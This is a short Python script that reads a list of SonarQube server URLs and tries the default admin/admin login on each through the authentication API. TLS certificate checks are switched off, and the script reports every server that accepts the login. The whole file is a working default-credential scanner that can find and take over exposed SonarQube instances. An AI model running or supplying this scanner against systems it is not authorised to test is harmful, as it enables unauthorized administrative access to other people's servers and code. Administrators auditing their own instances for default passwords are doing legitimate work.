import requests as rt
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urls = open("sonarqube-instance.txt","r")
data = {"login":"admin","password":"admin"}
endpoint="/api/authentication/login"
for url in urls.readlines():
    try:
        req = rt.post(url=url.rstrip("\n")+endpoint,data=data,verify=False)
        if req.status_code ==200:
            print("Login successful")
            print("Testing -"+url)
    except:
        pass